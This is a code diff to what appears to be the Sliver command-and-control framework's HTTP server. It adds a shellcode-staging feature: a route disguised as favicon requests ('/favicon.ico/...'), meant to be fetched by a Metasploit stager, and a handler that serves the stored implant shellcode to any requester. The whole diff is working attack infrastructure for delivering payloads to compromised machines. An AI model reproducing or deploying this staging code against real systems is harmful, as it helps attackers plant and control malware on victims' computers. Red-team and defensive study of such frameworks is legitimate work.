@@ -108,10 +108,11 @@ type HTTPServerConfig struct {
 
 // SliverHTTPC2 - Holds refs to all the C2 objects
 type SliverHTTPC2 struct {
-	HTTPServer *http.Server
-	Conf       *HTTPServerConfig
-	Sessions   *httpSessions
-	Cleanup    func()
+	HTTPServer      *http.Server
+	Conf            *HTTPServerConfig
+	Sessions        *httpSessions
+	SliverShellcode []byte // Sliver shellcode to serve during staging process
+	Cleanup         func()
 }
 
 // StartHTTPSListener - Start a mutual TLS listener
@@ -234,12 +235,17 @@ func (s *SliverHTTPC2) router() *mux.Router {
 	// .php = session
 	//  .js = poll
 	// .png = stop
+	// .ico = sliver shellcode
 
 	router.HandleFunc("/{rpath:.*\\.txt$}", s.rsaKeyHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
 	router.HandleFunc("/{rpath:.*\\.css$}", s.startSessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.php$}", s.sessionHandler).MatcherFunc(filterAgent).Methods(http.MethodGet, http.MethodPost)
 	router.HandleFunc("/{rpath:.*\\.js$}", s.pollHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
 	router.HandleFunc("/{rpath:.*\\.png$}", s.stopHandler).MatcherFunc(filterAgent).Methods(http.MethodGet)
+	// Can't force the user agent on the stager payload
+	// Request from msf stager payload will look like:
+	// GET /favicon.ico/B64_ENCODED_PAYLOAD_UUID
+	router.HandleFunc("/{rpath:.*\\.ico/.*$}", s.eggHandler).Methods(http.MethodGet)
 
 	// Request does not match the C2 profile so we pass it to the default handler
 	if s.Conf.StaticDir != "" {
@@ -463,6 +469,14 @@ func (s *SliverHTTPC2) stopHandler(resp http.ResponseWriter, req *http.Request) 
 	})
 	s.Sessions.Remove(session.ID)
 
+	resp.WriteHeader(200)
+}
+
+// eggHandler - Serves the sliver shellcode to the egg requesting it
+func (s *SliverHTTPC2) eggHandler(resp http.ResponseWriter, req *http.Request) {
+	httpLog.Infof("Received egg request from %s", req.RemoteAddr)
+	resp.Write(s.SliverShellcode)
+	httpLog.Infof("Serving sliver shellcode to %s", req.RemoteAddr)
 	resp.WriteHeader(200)
 }
 
